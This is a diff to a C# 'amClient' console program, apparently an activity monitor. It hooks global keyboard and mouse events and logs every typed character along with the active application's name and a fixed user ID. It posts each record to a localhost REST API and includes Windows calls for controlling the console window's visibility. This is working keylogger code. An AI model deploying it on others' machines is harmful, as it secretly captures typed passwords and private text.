@@ -5,16 +5,53 @@ using System.Net.Http.Headers;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
+using System.Diagnostics;
+using System.Collections.Generic;
 
 namespace amClient
 {
     class Program
     {
+        private static Dictionary<string, int> appGlobalCounter = new Dictionary<string, int>();
+
+        #region Attribute to Control Console Window
+
         [DllImport("user32.dll")]
         public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
 
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        #endregion
+
+        #region Attribute To Get Active Application
+
+        [DllImport("user32.dll")]
+        static extern int GetForegroundWindow();
+
+        [DllImport("user32")]
+        private static extern UInt32 GetWindowThreadProcessId(Int32 hWnd, out Int32 lpdwProcessId);
+
+        private static Int32 GetWindowProcessID(Int32 hwnd)
+        {
+            Int32 pid = 1;
+            GetWindowThreadProcessId(hwnd, out pid);
+            return pid;
+        }
+
+        private static string GetActiveApplicationName()
+        {
+            Int32 hwnd = 0;
+            hwnd = GetForegroundWindow();
+            string appProcessName = Process.GetProcessById(GetWindowProcessID(hwnd)).ProcessName;
+            string appExePath = Process.GetProcessById(GetWindowProcessID(hwnd)).MainModule.FileName;
+            string appExeName = appExePath.Substring(appExePath.LastIndexOf(@"\") + 1);
+
+            //return new string[] { appProcessName, appExePath, appExeName };
+            return appProcessName;
+        }
+
+        #endregion
 
         private static IKeyboardMouseEvents m_Events;
 
@@ -48,57 +85,22 @@ namespace amClient
         private static void Subscribe(IKeyboardMouseEvents events)
         {
             m_Events = events;
-            //m_Events.KeyDown += OnKeyDown;
-            //m_Events.KeyUp += OnKeyUp;
+
             m_Events.KeyPress += HookManager_KeyPress;
 
-            //m_Events.MouseUp += OnMouseUp;
             m_Events.MouseClick += OnMouseClick;
-            //m_Events.MouseDoubleClick += OnMouseDoubleClick;
-
-            //m_Events.MouseMove += HookManager_MouseMove;
-
-            //m_Events.MouseDragStarted += OnMouseDragStarted;
-            //m_Events.MouseDragFinished += OnMouseDragFinished;
-
-            //if (checkBoxSupressMouseWheel.Checked)
-            //    m_Events.MouseWheelExt += HookManager_MouseWheelExt;
-            //else
-            //    m_Events.MouseWheel += HookManager_MouseWheel;
-
-            //if (checkBoxSuppressMouse.Checked)
-            //    m_Events.MouseDownExt += HookManager_Supress;
-            //else
-            //    m_Events.MouseDown += OnMouseDown;
         }
 
         private static void Unsubscribe()
         {
             if (m_Events == null) return;
-            //m_Events.KeyDown -= OnKeyDown;
-            //m_Events.KeyUp -= OnKeyUp;
+
             m_Events.KeyPress -= HookManager_KeyPress;
 
-            //m_Events.MouseUp -= OnMouseUp;
             m_Events.MouseClick -= OnMouseClick;
-            //m_Events.MouseDoubleClick -= OnMouseDoubleClick;
-
-            //m_Events.MouseMove -= HookManager_MouseMove;
-
-            //m_Events.MouseDragStarted -= OnMouseDragStarted;
-            //m_Events.MouseDragFinished -= OnMouseDragFinished;
-
-            //if (checkBoxSupressMouseWheel.Checked)
-            //    m_Events.MouseWheelExt -= HookManager_MouseWheelExt;
-            //else
-            //    m_Events.MouseWheel -= HookManager_MouseWheel;
-
-            //if (checkBoxSuppressMouse.Checked)
-            //    m_Events.MouseDownExt -= HookManager_Supress;
-            //else
-            //    m_Events.MouseDown -= OnMouseDown;
 
             m_Events.Dispose();
+
             m_Events = null;
         }
 
@@ -107,11 +109,23 @@ namespace amClient
             //Log(string.Format("KeyPress \t\t {0}\n", e.KeyChar));
 
             var monitor = new amModel();
-            monitor.amModelId = Guid.NewGuid().ToString();
+            monitor.amModelId = GetActiveApplicationName();
             monitor.KeyLogCatch = e.KeyChar.ToString();
             monitor.InputType = "Keyboard";
             monitor.TimeStamp = DateTime.Now;
             monitor.userID = "HWK";
+
+            if (appGlobalCounter.ContainsKey(monitor.amModelId))
+            {
+                var count = appGlobalCounter[monitor.amModelId];
+                appGlobalCounter.Remove(monitor.amModelId);
+                appGlobalCounter.Add(monitor.amModelId, count);
+            }
+            else
+            {
+                appGlobalCounter.Add(monitor.amModelId, 1);
+            }
+
 
             CreateMonitoringAsync(monitor);
         }
@@ -121,7 +135,7 @@ namespace amClient
             //Log(string.Format("MouseClick \t\t {0}\n", e.Button));
 
             var monitor = new amModel();
-            monitor.amModelId = Guid.NewGuid().ToString();
+            monitor.amModelId = GetActiveApplicationName();
             monitor.KeyLogCatch = e.Button.ToString();
             monitor.InputType = "Mouse";
             monitor.TimeStamp = DateTime.Now;
@@ -136,13 +150,15 @@ namespace amClient
             //textBoxLog.AppendText(text);
             //textBoxLog.ScrollToCaret();
         }
-        
+
+        #region To Send Data Using Rest API
+
         static HttpClient client = new HttpClient();
 
         static async Task RunAsync()
         {
             // New code:
-            client.BaseAddress = new Uri("http://localhost:4988");
+            client.BaseAddress = new Uri("http://localhost:5000");
             client.DefaultRequestHeaders.Accept.Clear();
             client.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue("application/json"));
         }
@@ -160,11 +176,13 @@ namespace amClient
 
         static async Task<Uri> CreateMonitoringAsync(amModel monitor)
         {
-            HttpResponseMessage response = await client.PostAsJsonAsync("api/amController", monitor);
+            HttpResponseMessage response = await client.PostAsJsonAsync("api/amController/Create", monitor);
             response.EnsureSuccessStatusCode();
 
             // Return the URI of the created resource.
             return response.Headers.Location;
         }
+
+        #endregion
     }
 }
